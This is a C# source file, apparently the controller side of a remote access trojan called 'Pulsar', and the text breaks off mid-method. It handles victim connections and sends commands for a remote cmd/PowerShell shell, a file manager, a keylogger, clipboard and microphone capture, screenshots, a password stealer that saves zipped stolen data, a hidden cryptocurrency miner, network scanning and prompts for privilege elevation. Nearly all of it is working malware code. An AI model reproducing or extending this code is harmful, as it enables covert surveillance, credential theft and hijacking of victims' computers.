using server.Classes;
using server.Forms;
using server.Forms.misc_forms;
using server.Others;
using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Message = server.Classes.Message;
namespace server
{

    public partial class Form1 : Form
    {
        public static Server MainServer = new Server();

        #region Declarations
        static string KeyDirectory_Path = Application.StartupPath + @"\RSA Keys";
        string PublicKeypath = KeyDirectory_Path + @"\PublicKey.pke";
        string PublicKey = "";
        public int CurrentSelectedID;
        private Forms.frm_filemanager FE = new Forms.frm_filemanager();
        private frm_Network frm_net = new frm_Network();
        private frm_miner FM = new frm_miner();
        private frm_cmd shell;
        private frm_Microphon RMIC;
        frm_screenshot screenshot_frm;
        public Thread updateimg;
        public static bool isLoging;
        #endregion


        public Form1()
        {
            InitializeComponent();

        }

        private void Form1_Load(object sender, EventArgs e)
        {
            CheckForIllegalCrossThreadCalls = false;
            CheackforKeys();
            Logger.Log("Pulsar Started at " + DateTime.Now, "log");


        }

        public void CheackforKeys()
        {
            //Here cheack there is any of the public and privat key in the folder
            // if not then generate a public and privat key before going further 
            string KeyDirectory_Path = Application.StartupPath + @"\RSA Keys";
            string PrivateKeypath = KeyDirectory_Path + @"\PrivateKey.kez";
            string PublicKeypath = KeyDirectory_Path + @"\PublicKey.pke";
            if (!Directory.Exists(KeyDirectory_Path))
            {
                Crypto.GenKeys(1024);
            }
            else
            {
                if (!File.Exists(PrivateKeypath) | File.Exists(PublicKeypath))
                {
                    Crypto.GenKeys(1024);
                }
            }
            PublicKey = File.ReadAllText(PublicKeypath);

        }

        #region Server Control
        void Startconnection(int Port)
        {
            if (MainServer.Active) return;
            try
            {

                MainServer.Start(Port);
                lblStatus.ForeColor = Color.Green;
                lblS.ForeColor = Color.Green;
                lblStatus.Text = "Online";
                Text = "Pulsar - Online (" + Port + ")";
                formSkin2.Text = "Pulsar - Online (" + Port + ")";
                Logger.Log("Started listning on port >>>> " + Port, "log");
                GetDataLoop.Start();

            }
            catch (Exception EX)
            {
                MessageBox.Show("Error: " + EX.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                Logger.Log("Error whil trying to start connection " + Environment.NewLine + EX.Message, "error");

            }

        }
        private void flatButton1_Click(object sender, EventArgs e)
        {
            Startconnection((int)PortNumber.Value);

        }

        #endregion



        #region Data Handler
        public async void GetRecievedData()
        {

            Message Data;
            while (MainServer.GetNextMessage(out Data))
                switch (Data.eventType)
                {
                    case EventType.Connected:




                        break;

                    case EventType.Disconnected:

                        for (int n = listClients.Items.Count - 1; n >= 0; --n)
                        {
                            ListViewItem LVI = listClients.Items[n];
                            if (LVI.SubItems[0].Text.Contains(Data.connectionId.ToString()))
                                Logs.Text += DateTime.Now + " || " + " The user " + LVI.SubItems[2].Text + " has Disconected" + Environment.NewLine;
                            listClients.Items.Remove(LVI);
                            Logs.Refresh();

                        }

                        break;

                    case EventType.Data:
                        HandleData(Data.connectionId, Data.data);
                        break;
                }
        }
        public void HandleData(int ConnectionId, byte[] RawData)
        {

            byte[] ToProcess = RawData.Skip(1).ToArray();

            //Process type of data
            switch (RawData[0])
            {



                // Quick Safe LZ might be the reason why  the rdc wont work

                case 0: //Connection info

                    Basicinfo(ConnectionId, ToProcess);
                    break;
                case 1: // cmd shell output 
                    ToProcess = Crypto.byte_Decrypt_Compressed(ToProcess);
                    Console.WriteLine(Helper.Getstrings(ToProcess));
                    shell.PrintMessage(Helper.Getstrings(ToProcess), Enums.WHICHCMD.CMD);
                    break;
                case 27:
                    ToProcess = Crypto.byte_Decrypt_Compressed(ToProcess);
                    shell.PrintError(Helper.Getstrings(ToProcess), Enums.WHICHCMD.CMD);
                    break;
                case 2: //Filelist
                    ToProcess = Crypto.byte_Decrypt_Compressed(ToProcess);
                    UpdateFiles(Helper.Getstrings(ToProcess));
                    break;
                case 3: //Drive List
                    ToProcess = Crypto.byte_Decrypt_Compressed(ToProcess);
                    Updatedrive(Helper.Getstrings(ToProcess));
                    break;
                case 4: //Remot desktop info
                    ToProcess = Crypto.byte_Decrypt_Compressed(ToProcess);
                    HandleRDPinfo(Helper.Getstrings(ToProcess));
                    break;
                case 5://Remot desktop images
                    ToProcess = Crypto.byte_Decrypt_Compressed(ToProcess);
                    HandleRDPImage(ToProcess);
                    break;
                case 6: // CurrentDirectory
                    ToProcess = Crypto.byte_Decrypt_Compressed(ToProcess);
                    FE.CurDir = Helper.Getstrings(ToProcess);
                    FE.CurrentDir.Text = Helper.Getstrings(ToProcess);
                    FE.txtCurrentDirectory.Text = Helper.Getstrings(ToProcess);
                    break;
                case 7: // Error handling
                    ToProcess = Crypto.byte_Decrypt_Compressed(ToProcess);
                    Shared_data.errormessage = Helper.Getstrings(ToProcess);
                    showfrmerror();
                    break;
                case 8: // File Manager Download
                    Console.WriteLine(ToProcess.Length);
                    ToProcess = Crypto.byte_Decrypt_Compressed(ToProcess);
                    File.WriteAllBytes(FE.TempZipFolder, ToProcess);
                    System.IO.Compression.ZipFile.ExtractToDirectory(FE.TempZipFolder, Common.current_path + @"\Downloads");
                    File.Delete(FE.TempZipFolder);
                    FE.TempZipFolder = null;
                    Process.Start(Common.current_path + @"\Downloads");
                    break;
                case 9: //Notification

                    ToProcess = Crypto.byte_Decrypt_Compressed(ToProcess);
                    string k = Helper.Getstrings(ToProcess);
                    shownotif(k);
                    break;
                case 10: //clipboard
                    ToProcess = Crypto.byte_Decrypt_Compressed(ToProcess);
                    Shared_data.clip_data = Helper.Getstrings(ToProcess);
                    Shared_data.clip_isready = true;
                    break;
                case 11: //information

                    ToProcess = Crypto.byte_Decrypt_Compressed(ToProcess);
                    Shared_data.information_data = Helper.Getstrings(ToProcess);
                    Shared_data.info_ready = true;

                    break;
                case 12: //keylogs
                    ToProcess = Crypto.byte_Decrypt_Compressed(ToProcess);
                    Shared_data.keylog_data = Helper.Getstrings(ToProcess);
                    Shared_data.keylog_isready = true;
                    break;
                case 13: //proclist
                    ToProcess = Crypto.byte_Decrypt_Compressed(ToProcess);
                    Updateprocs(CurrentSelectedID, Helper.Getstrings(ToProcess));
                    break;
                case 14://Minner
                    ToProcess = Crypto.byte_Decrypt_Compressed(ToProcess);
                    updateminer(CurrentSelectedID, Helper.Getstrings(ToProcess));
                    break;
                case 15://config_miner
                    ToProcess = Crypto.byte_Decrypt_Compressed(ToProcess);
                    if (FM.Visible == true)
                        FM.fastColoredTextBox1.Text = Helper.Getstrings(ToProcess);
                    File.WriteAllText(Common.current_path + @"\MinnerConfig.json", Helper.Getstrings(ToProcess));
                    break;
                case 16: //Minner Cmd
                    ToProcess = Crypto.byte_Decrypt_Compressed(ToProcess);
                    FM.cmd = Helper.Getstrings(ToProcess);
                    break;
                case 18: //Stealer MUST TRY AND SET PASSWORD TO THE ZIP FILE
                    string stealerpath = Common.current_path + @"\Stealer";
                    string zipedPath = Common.current_path + @"\Stealer\zipped.zip";
                    if (!Directory.Exists(stealerpath))
                        Directory.CreateDirectory(stealerpath);
                    File.WriteAllBytes(zipedPath, ToProcess);
                    System.IO.Compression.ZipFile.ExtractToDirectory(zipedPath, stealerpath);
                    File.Delete(zipedPath);
                    break;
                case 19:// Update Netwrok info in the frm_Network
                    ToProcess = Crypto.byte_Decrypt_Compressed(ToProcess);
                    frm_net.fastColoredTextBox1.Text = Helper.Getstrings(ToProcess);
                    frm_net.ID = CurrentSelectedID;
                    break;
                case 20: // Update list of alive hosts in the frm_Network
                    ToProcess = Crypto.byte_Decrypt_Compressed(ToProcess);
                    netScanne(Helper.Getstrings(ToProcess));
                    break;
                case 21: // TO BE REMOVED try and do it localy 

                    updateProgresseScanne(Helper.Getstrings(ToProcess));
                    break;
                case 22: // Save client Key
                    SetKey(ConnectionId, ToProcess);
                    break;
                case 23: // Loading the thumbnail  picture that show's up in FileExplorer 
                    ToProcess = Crypto.byte_Decrypt_Compressed(ToProcess);
                    LoadTmpimg(ToProcess);
                    break;
                case 24:
                    ToProcess = Crypto.byte_Decrypt_Compressed(ToProcess);
                    Toedit = Helper.Getstrings(ToProcess);
                    Thread trd = new Thread(openEditor);
                    trd.SetApartmentState(ApartmentState.STA);
                    trd.Start();
                    break;
                case 25: // Minner update download Progress
                    ToProcess = Crypto.byte_Decrypt_Compressed(ToProcess);
                    updateDownload(Helper.Getstrings(ToProcess));
                    break;
                case 26:
                    ToProcess = Crypto.byte_Decrypt_Compressed(ToProcess);
                    UpdateminerSYS(ConnectionId, Helper.Getstrings(ToProcess));
                    break;
                case 28:
                    ToProcess = Crypto.byte_Decrypt_Compressed(ToProcess);

                    UpdateSysRes(Helper.Getstrings(ToProcess));
                    break;
                case 29:
                    ToProcess = Crypto.byte_Decrypt_Compressed(ToProcess);
                    shell.PrintMessage(Helper.Getstrings(ToProcess), Enums.WHICHCMD.POWERSHELL);
                    break;
                case 30:
                    ToProcess = Crypto.byte_Decrypt_Compressed(ToProcess);
                    shell.PrintMessage(Helper.Getstrings(ToProcess), Enums.WHICHCMD.POWERSHELL);
                    break;
                case 31:
                    ToProcess = Crypto.byte_Decrypt_Compressed(ToProcess);
                    RMIC.PlayAudio(ToProcess);
                    break;
                case 32:
                    ToProcess = Crypto.byte_Decrypt_Compressed(ToProcess);
                    HandleRMICinfo(Helper.Getstrings(ToProcess));
                    break;


            }

        }
        private void GetDataLoop_Tick(object sender, EventArgs e)
        {
            GetRecievedData();
        }
        #endregion

        #region Forms & Controls
        void updateDownload(string data)
        {
            if (data.StartsWith("mnrdw"))
            {
                if (data.Contains("done"))
                {
                    FM.panel1.Visible = false;
                    MessageBox.Show("Setup is now complet !", "Pulsar", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    FM.Refrech.Enabled = true;
                    return;
                }


                string[] splited = data.Split('~');
                FM.progress.Value = int.Parse(splited[2]);
                FM.downloaded.Text = splited[1];
            }


        }
        string Toedit = "";

        private void CheckKeyword(string word, Color color, int startIndex)
        {
            if (this.Logs.Text.Contains(word))
            {
                int index = -1;
                int selectStart = this.Logs.SelectionStart;

                while ((index = this.Logs.Text.IndexOf(word, (index + 1))) != -1)
                {
                    this.Logs.Select((index + startIndex), word.Length);
                    this.Logs.SelectionColor = color;
                    this.Logs.Select(selectStart, 0);
                    this.Logs.SelectionColor = Color.Black;
                }
            }
        }
        void openEditor()
        {

            frm_TextEditor frm = new frm_TextEditor();
            frm.ConnectionID = FE.ConnectionID;
            frm.fastColoredTextBox1.Text = Toedit;
            frm.ShowDialog();
        }
        void showfrmerror()
        {
            Forms.frm_error frm = new Forms.frm_error();
            frm.ShowDialog();
        }
        private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            frm_DuckDnsConfig frmduck = new frm_DuckDnsConfig();
            frmduck.ShowDialog();
        }
        private void timer2_Tick(object sender, EventArgs e)
        {
            formSkin2.Text = "Pulsar - listening on port " + PortNumber.Value.ToString() + " || " + "Users : " + listClients.Items.Count;
            this.Text = "Pulsar - listening on port " + PortNumber.Value.ToString() + " || " + "Users : " + listClients.Items.Count;
            if (listClients.SelectedItems.Count != 0)
            {
                MenuStrip1.Enabled = true;
                if (listClients.FocusedItem.SubItems[2].Text != string.Empty)
                {
                    Common.current_id = int.Parse(listClients.FocusedItem.SubItems[0].Text);
                    Common.current_name = listClients.FocusedItem.SubItems[2].Text;
                    Common.current_path = Application.StartupPath + @"\Users" + "\\" + listClients.FocusedItem.SubItems[2].Text + "\\";
                    Common.Current_Key = Helper.ReadRegKey(Common.current_name + "-" + listClients.FocusedItem.SubItems[1].Text, "Pulsar Keys");
                    lblStatus.Text = "Active Connections " + listClients.Items.Count + "  ||  " + "Selected user : " + Common.current_name;
                    folderToolStripMenuItem.Text = "Folder of " + listClients.FocusedItem.SubItems[2].Text;
                    lblStatus.ForeColor = Color.White;
                }


            }
            else
            {
                folderToolStripMenuItem.Text = "Folder";
                MenuStrip1.Enabled = false;
                lblStatus.Text = "Active Connections " + listClients.Items.Count + "  ||  " + "Selected user : none";
                lblStatus.ForeColor = Color.White;
            }
        }
        private void lbConnectedClients_SelectedIndexChanged(object sender, EventArgs e)
        {
            try
            {
                ListViewItem LVI = listClients.SelectedItems[0];
                CurrentSelectedID = Convert.ToInt16(LVI.SubItems[0].Text);
                //lblCurrentID.Text = "Client ID: " + CurrentSelectedID;
            }
            catch { }
        }




        #endregion

        #region Duck Dns Updater
        public delegate void MyDelegate(ListView l);







        #endregion
        #region Methods

        public void SetKey(int Id, byte[] data)
        {
            string KeyDirectory_Path = Application.StartupPath + @"\RSA Keys";
            string Key = Helper.Getstrings(data);
            Key = Crypto.DecryptString(Key, KeyDirectory_Path + @"\PrivateKey.kez");


            var item = listClients.FindItemWithText(Id.ToString());
            if (item != null)
            {

                int index = listClients.Items.IndexOf(item);
                string username = listClients.Items[index].SubItems[2].Text + "-" + listClients.Items[index].SubItems[1].Text;
                Helper.CreateRegKey(username, Key, "Pulsar Keys");

            }
            else
                Console.WriteLine("item is null");

        }

        public Image ByteToImg(byte[] img)
        {
            using (var ms = new MemoryStream(img))
            {
                return Image.FromStream(ms);
            }
        }




        #region Network
        public void updateProgresseScanne(string data)
        {


            frm_net.flatLabel2.Text = data;

        }
        public void netScanne(string data)
        {
            var matches = Regex.Matches(data, @"\-(?<IPAD>[^-]+)\-@(?<HOSTN>[^@]+)@#(?<STATUE>[^#]+)#");
            frm_net.Hostlist.Items.Clear();
            if (frm_net.Visible == true && frm_net.ID == CurrentSelectedID)
            {
                foreach (Match match in matches)
                {
                    string IPadresse = match.Groups["IPAD"].Value;
                    string HostName = match.Groups["HOSTN"].Value;
                    string ipStatue = match.Groups["STATUE"].Value;
                    string[] ToAdd = { IPadresse, HostName, ipStatue };
                    var ListItem = new ListViewItem(ToAdd);
                    frm_net.Hostlist.Items.Add(ListItem);

                }
                frm_net.Hostlist.Enabled = true;
                frm_net.panel1.Visible = false;
                frm_net.panel2.Enabled = true;
            }


        }
        #endregion
        #region Error && notification
        public void shownotif(string data)
        {
            Shared_data.notifmessage = data;
            Forms.frm_notif frm = new Forms.frm_notif();
            frm.ShowDialog();



        }

        #endregion
        #region miner
        public void updateminer(int id, string data)
        {

            FM.id = id;

            string[] recived = data.Split('~');
            FM.isinstaled.Text = recived[0];

            FM.statue.Text = recived[2];
            FM.updateprogbar();
            FM.user_idl.Text = recived[3];
            FM.miner.Text = recived[4];
            FM.wallet_lbl.Text = recived[6];
            FM.Refrech.Start();

        }
        public void UpdateminerSYS(int id, string data)
        {
            string[] recived = data.Split('~');

            int totalram, freeram;

            FM.cpuval = int.Parse(recived[2]);
            totalram = int.Parse(recived[0]);
            freeram = int.Parse(recived[1]);
            FM.flatLabel3.Text = Helper.ToFileSize(freeram) + @" / " + Helper.ToFileSize(totalram);
            FM.circularProgressBar1.Maximum = totalram;
            FM.circularProgressBar1.Value = totalram - freeram;

        }
        #endregion
        #region Procmgr
        public void Updateprocs(int id, string Processes)
        {

            var matches = Regex.Matches(Processes, @"\*(?<pname>[^*]+)\*_(?<pid>[^_]+)_-(?<ptitel>[^-]+)-@(?<pram>[^@]+)@");

            frm_procmgr CRA = new frm_procmgr();
            CRA.Show();
            CRA.id = CurrentSelectedID;
            CRA.Text = "Running Applications - " + CRA.id;
            if (CRA.id == CurrentSelectedID)
            {
                CRA.lbRunningProcesses.Items.Clear();
                foreach (Match match in matches)
                {

                    string PName = match.Groups["pname"].Value;
                    string PID = match.Groups["pid"].Value;
                    string PWindow = match.Groups["ptitel"].Value;
                    string Pram = Helper.ToFileSize(Convert.ToDouble(match.Groups["pram"].Value));

                    string[] ToAdd = { PName, PID, PWindow, Pram };
                    var ListItem = new ListViewItem(ToAdd);
                    if (PName.Contains("(Client)"))
                    {
                        ListItem.BackColor = Color.Red;
                    }
                    CRA.lbRunningProcesses.Items.Add(ListItem);

                }
            }
        }
        public void UpdateSysRes(string data)
        {
            string[] recived = data.Split('~');

            //  int totalram, freeram;
            foreach (frm_procmgr prc in Application.OpenForms.OfType<frm_procmgr>())
            {
                int usedram;
                decimal percent_usedram;
                decimal totalR;
                decimal UsedR;
                decimal FreeR;

                prc.CPU_Value.Value = int.Parse(recived[2]);
                totalR = int.Parse(recived[0]);
                FreeR = int.Parse(recived[1]);
                UsedR = totalR - FreeR;
                prc.Ram_value.Maximum = (int)totalR;
                prc.Ram_value.Value = (int)UsedR;
                /* usedram = totalram - freeram;
                 totalR = totalram;
                 FreeR = freeram;*/
                UsedR = totalR - FreeR;
                percent_usedram = (UsedR / totalR) * 100m;

                prc.StatusBar1.Text = string.Format("Runing Proceses : {0} | CPU Usage {1} | MemoryUsage : {2} ", prc.lbRunningProcesses.Items.Count, recived[2] + "%",
                    UsedR + " Out of " + totalR);
                prc.flatLabel22.Text = recived[2] + "%";
                prc.flatLabel3.Text = (int)percent_usedram + "%";
            }
        }
        #endregion
        #region File Manger
        void LoadTmpimg(byte[] data)
        {
            if (FE.Visible && FE.ConnectionID == CurrentSelectedID && FE.Update)
            {

                FE.pictureBox1.Image = ByteToImg(data);
            }
        }


        void UpdateFiles(string Files)
        {


            var matches = Regex.Matches(Files, @"\*(?<fpath>[^*]+)\*_(?<ftype>[^_]+)_-(?<ftime>[^-]+)-@(?<fsize>[^@]+)@");

            FE.lbFiles.Clear();
            FE.lbFiles.Columns.Add("File Name");
            FE.lbFiles.Columns.Add("Extension");
            FE.lbFiles.Columns.Add("Creations Date");
            FE.lbFiles.Columns.Add("Size");
            foreach (frm_filemanager FE in Application.OpenForms.OfType<frm_filemanager>())
                FE.InDrives = true;
            if (FE.Visible && FE.ConnectionID == CurrentSelectedID && FE.Update)
            {
                FE.lbFiles.Items.Clear();
                foreach (Match match in matches)
                {

                    string Filename = match.Groups["fpath"].Value;
                    string Extension = match.Groups["ftype"].Value;
                    string DateCreated = match.Groups["ftime"].Value;
                    string size = match.Groups["fsize"].Value;
                    string[] ToAdd = { Filename, Extension, DateCreated, size };
                    var ListItem = new ListViewItem(ToAdd);
                    ListItem.ImageKey = Extension + ".ico";
                    FE.lbFiles.Items.Add(ListItem);
                }
                Helper.SetListViewColumnSizes(FE.lbFiles, -2);
                FE.panel1.Visible = false;
                return;


            }

        }
        //  THIS IS USED TO ADD IN A PROGRESSE BAR TO THE LISTVIEW OF THE FILEMANAGER WHEN SHOWING DRIVES AND THAIR 
        // SPACE USED IN THEM
        private void AddDisk(string key, string Disk_Name, string Disk_Type, int Disk_value, ListView lv)
        {
            ListViewItem lvi = new ListViewItem();
            ProgressBar pb = new ProgressBar();

            lvi.SubItems[0].Text = Disk_Name;
            lvi.SubItems.Add(Disk_Type);
            lvi.SubItems.Add("");
            lvi.SubItems.Add(key);            // LV has 3 cols; this wont show
            lv.Items.Add(lvi);

            Rectangle r = lvi.SubItems[2].Bounds;
            pb.SetBounds(r.X, r.Y, r.Width, r.Height);
            pb.Minimum = 1;
            pb.Maximum = 100;
            pb.Value = Disk_value;
            pb.Name = key;                   // use the key as the name
            lv.Controls.Add(pb);
        }

        void Updatedrive(string data)
        {


            var matches = Regex.Matches(data, @"\*(?<Droot>[^*]+)\*_(?<Dtype>[^_]+)_-(?<DSize>[^-]+)-");
            FE.ConnectionID = CurrentSelectedID;

            FE.lbFiles.Clear();
            FE.lbFiles.Columns.Add("Drive Letter");
            FE.lbFiles.Columns.Add("Type");
            FE.lbFiles.Columns.Add("Size");

            foreach (Forms.frm_filemanager fe in Application.OpenForms.OfType<Forms.frm_filemanager>())

                fe.InDrives = false;
            foreach (Match match in matches)
            {


                string driveletter = match.Groups["Droot"].Value;
                string drivetype = match.Groups["Dtype"].Value;
                string Size = match.Groups["DSize"].Value;

                string[] ToAdd = { driveletter, drivetype, Size };

                var ListItem = new ListViewItem(ToAdd);
                ListItem.ImageKey = "drive.ico";
                FE.lbFiles.Items.Add(ListItem);


            }
            Helper.SetListViewColumnSizes(FE.lbFiles, -2);



        }
        #endregion
        #region Screenshot

        public void HandleRDPinfo(string data)
        {
            screenshot_frm = new frm_screenshot();
            screenshot_frm.Show();
            screenshot_frm.ID = CurrentSelectedID;
            screenshot_frm.flatComboBox1.Items.Clear();
            var matches = Regex.Matches(data, @"\~(?<SCR>[^~]+)\~#(?<RESO>[^#]+)#");
            foreach (Match match in matches)
            {
                string scr = match.Groups["SCR"].Value;
                string res = match.Groups["RESO"].Value;
                screenshot_frm.flatComboBox1.Items.Add(scr);
                screenshot_frm.flatComboBox2.Items.Add(res);

            }

            screenshot_frm.flatComboBox1.SelectedIndex = 0;
            screenshot_frm.flatComboBox2.SelectedIndex = 0;

        }
        public void HandleRDPImage(byte[] data)
        {
            Random rnd = new Random();

            Image image = ByteToImg(data);
            if (screenshot_frm.flatCheckBox1.Checked)
            {
                image.Save(Common.current_path + @"\Screenshots\" + rnd.Next(1000000) + ".jpeg");
            }

            screenshot_frm.pictureBox1.Image = image;
        }

        #endregion
        #region Client Information
        public void Basicinfo(int ConnectionId, byte[] data)
        {
            string ClientAddress = MainServer.GetClientAddress(ConnectionId);

            listClients.Items.Add(new ListViewItem(new[] { ConnectionId.ToString() }));

            string str_data = Helper.DecompressString(Helper.Getstrings(data));
            string[] splited = str_data.Split('~');
            int index = listClients.Items.Count - 1;

            string clientpath = Application.StartupPath + "\\users\\" + splited[1] + "\\";
            ListViewItem client = listClients.Items[0];

            client.SubItems.Add(splited[0]); // TAG
            client.SubItems.Add(splited[1]); // USERNAME
            client.SubItems.Add(splited[2]); // OPERATING SYSTEM 
            client.SubItems.Add(splited[3]); // Country
            client.SubItems.Add(splited[4]); // STUB VERSION
            client.SubItems.Add(splited[5]); // is Admin
            client.SubItems.Add(splited[7]); // ip Adresse
            client.ImageKey = splited[6] + ".png"; //country code for imageKey

            Helper.SetListViewColumnSizes(listClients, -2);


            Notif_data.username_tag = splited[1] + " - " + splited[0];
            Notif_data.IP = splited[7];
            Notif_data.OS = splited[2];
            Notif_data.Country = splited[3];
            Notif_data.CountryCode = splited[6] + ".png";
            if (flatCheckBox3.Checked)
            {
                frm_newclient frmnew = new frm_newclient();
                frmnew.Show();
            }


            //  string keyname = splited[1] + "-" + splited[0];
            CheackforKeys();
            MainServer.SendKey(ConnectionId, Helper.Getbytes("PUB_Key449" + Helper.CompressString(PublicKey)));


            //   server.Others.Helper.notif.Start();
            if (Directory.Exists(clientpath) == false)
            {


                Directory.CreateDirectory(clientpath);
                Logs.Text += DateTime.Now + " ||  A New user from : " + splited[1] + "/" + splited[0] + Environment.NewLine;

            }
            else
                Logs.Text += DateTime.Now + " ||  The user  : " + splited[1] + "/" + splited[0] + " has Connected" + Environment.NewLine;
        }




        #endregion
        #region RMIC
        public void HandleRMICinfo(string Data)
        {
            Data = Data.Replace("Microphone", "");
            string[] splited = Data.Split('~');

            RMIC.flatComboBox1.Items.Clear();
            foreach (string s in splited)
            {
                if (string.IsNullOrEmpty(s))
                    continue;

                RMIC.flatComboBox1.Items.Add(s);

            }
            RMIC.flatButton2.Enabled = true;
            RMIC.flatButton3.Enabled = true;
        }
        public void HandleRMICAudio(byte[] Data)
        {
            RMIC.PlayAudio(Data);
        }

        #endregion
        public static string GetSubstringByString(string a, string b, string c)
        {
            try
            {
                return c.Substring(c.IndexOf(a) + a.Length, c.IndexOf(b) - c.IndexOf(a) - a.Length);
            }
            catch
            {
                return "";
            }
        }
        #endregion

        private void panel2_Paint(object sender, PaintEventArgs e)
        {

        }
        #region Settings
        // RegKeyName
        //Pulsar Settings

        public void Loadsettings()
        {

            try
            {
                int PortN = int.Parse(Helper.ReadRegKey("Port Number", "Pulsar Settings"));

                bool AutoConnect = bool.Parse(Helper.ReadRegKey("AutoConnect", "Pulsar Settings"));
                bool EnableLog = bool.Parse(Helper.ReadRegKey("Enable loging", "Pulsar Settings"));
                bool Notif = bool.Parse(Helper.ReadRegKey("New Connections Notif", "Pulsar Settings"));

                switch (AutoConnect)
                {
                    case true:
                        flatCheckBox1.Checked = true;
                        Startconnection(PortN);
                        break;
                    case false:
                        flatCheckBox1.Checked = false;
                        break;
                }
                flatCheckBox2.Checked = EnableLog;
                isLoging = EnableLog;
                flatCheckBox3.Checked = Notif;
                switch (Helper.ReadRegKey("DNS Updater", "Pulsar Settings"))
                {

                    case "True":
                        DuckDnsUpdater.DoUpdate();
                        break;
                    case "False":
                        flatCheckBox3.Checked = false;
                        break;
                }
            }

            catch
            {

            }




        }

        public void SaveSettings()
        {
            Helper.CreateRegKey("AutoConnect", flatCheckBox1.Checked.ToString(), "Pulsar Settings");
            Helper.CreateRegKey("Enable loging", flatCheckBox2.Checked.ToString(), "Pulsar Settings");
            Helper.CreateRegKey("Port Number", PortNumber.Value.ToString(), "Pulsar Settings");
            Helper.CreateRegKey("New Connections Notif", flatCheckBox3.Checked.ToString(), "Pulsar Settings");
            Helper.CreateRegKey("DNS Updater", flatCheckBox4.Checked.ToString(), "Pulsar Settings");
        }


        private void flatButton2_Click(object sender, EventArgs e)
        {
            SaveSettings();
        }




        #endregion
        #region Menu

        private void openNetwork()
        {
            frm_net = new frm_Network();
            frm_net.ShowDialog();
            frm_net.ID = CurrentSelectedID;
        }
        private void networkToolStripMenuItem_Click(object sender, EventArgs e)
        {

            MainServer.Send(CurrentSelectedID, Helper.Getbytes("GMG_Network"), Common.Current_Key);
            Thread tdd = new Thread(openNetwork);
            tdd.SetApartmentState(ApartmentState.STA);
            tdd.Start();
        }
        // Button Start RDP

        void openstealer()
        {
            frm_Stealer frm = new frm_Stealer();
            frm.ShowDialog();
        }
        private void passwordsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (Directory.Exists(Common.current_path + @"\Stealer\"))
            {
                Directory.Delete(Common.current_path + @"\Stealer\");
            }
            MainServer.Send(CurrentSelectedID, Helper.Getbytes("STLRrun"), Common.Current_Key);
            Thread frm_s = new Thread(openstealer);
            frm_s.SetApartmentState(ApartmentState.STA);
            frm_s.Start();
        }
        private void settingsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            frm_builderr frmbuilder = new frm_builderr();
            frmbuilder.Show();
        }

        private void updateToolStripMenuItem_Click_1(object sender, EventArgs e)
        {
            if (Shared_data.Canupload)
            {
                MessageBox.Show("");
                Shared_data.Canupload = false;
                using (OpenFileDialog ofd = new OpenFileDialog())
                {
                    if (ofd.ShowDialog() == DialogResult.OK)
                    {
                        string Filepath = ofd.FileName;
                        byte[] FileBytes;
                        using (FileStream FS = new FileStream(Filepath, FileMode.Open))
                        {
                            FileBytes = new byte[FS.Length];
                            FS.Read(FileBytes, 0, FileBytes.Length);
                        }
                        AutoClosingMessageBox.Show("Starting client update.", "Starting Upload", 1000);
                        MainServer.Send(CurrentSelectedID,
                      Encoding.ASCII.GetBytes("FileReceiveUp{" + Path.GetFileName(Filepath) + "}"), Common.Current_Key);
                        Thread.Sleep(80);
                        MainServer.Send(CurrentSelectedID, FileBytes, Common.Current_Key);
                        Shared_data.Canupload = true;
                    }

                    else
                    {
                        MessageBox.Show("Can not upload multiple files at once", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    }
                }
            }
        }
        private void disconnectToolStripMenuItem_Click(object sender, EventArgs e)
        {
            MainServer.Send(CurrentSelectedID, Helper.Getbytes("Disconnect"), Common.Current_Key);
        }
        private void raisePermissionLevelToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (MessageBox.Show("This will prompt the User with the UAC panel , are you sure about this ?", "Warning !", MessageBoxButtons.YesNo) == DialogResult.Yes)
            {
                MainServer.Send(CurrentSelectedID, Encoding.ASCII.GetBytes("RaisePerms"), Common.Current_Key);
            }

        }

        //Miner
        private void minerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            MainServer.Send(CurrentSelectedID, Helper.Getbytes("MINER"), Common.Current_Key);
            Thread.Sleep(1000);
            FM.id = CurrentSelectedID;
            FM = new frm_miner();
            FM.Show();
        }
        //file manager
        private void fileMangerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            MainServer.Send(CurrentSelectedID, Helper.Getbytes("FMDRV"), Common.Current_Key);
            FE = new Forms.frm_filemanager();
            FE.Show();
        }
        // cmd
        private void cMDToolStripMenuItem_Click(object sender, EventArgs e)
        {
            MainServer.Send(CurrentSelectedID, Helper.Getbytes(Commands.cmd_start), Common.Current_Key);

            shell = new Forms.frm_cmd();
            shell.Show();
            shell.ID = CurrentSelectedID;
        }
        //exit
        private void exitToolStripMenuItem_Click_1(object sender, EventArgs e)
        {
            this.Close();
        }
        //Clipbaord
        private void clipboardToolStripMenuItem_Click_1(object sender, EventArgs e)
        {
            MainServer.Send(CurrentSelectedID, Helper.Getbytes("GetClip"), Common.Current_Key);

            Thread t = new Thread(Helper.openclipboard);
            t.SetApartmentState(ApartmentState.STA);
            t.Start();
        }
        //ScreenCapture
        private void screenCaptureToolStripMenuItem_Click(object sender, EventArgs e)
        {
            MainServer.Send(CurrentSelectedID, Helper.Getbytes("RDPINFO"), Common.Current_Key);

        }
        private void folderToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Process.Start(Common.current_path);
        }

        private void keyloggerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            MainServer.Send(CurrentSelectedID, Helper.Getbytes("Getkeylog"), Common.Current_Key);
            Forms.frm_keylogger frm = new Forms.frm_keylogger();
            frm.Show(this);
        }

        private void taskManagerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            MainServer.Send(CurrentSelectedID, Encoding.ASCII.GetBytes("GetProcesses"), Common.Current_Key);
        }

        private void closeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            MainServer.Send(CurrentSelectedID, Helper.Getbytes("ClientClose"), Common.Current_Key);

        }


        private void informationToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (!File.Exists(Common.current_path + @"\information.html"))
            {

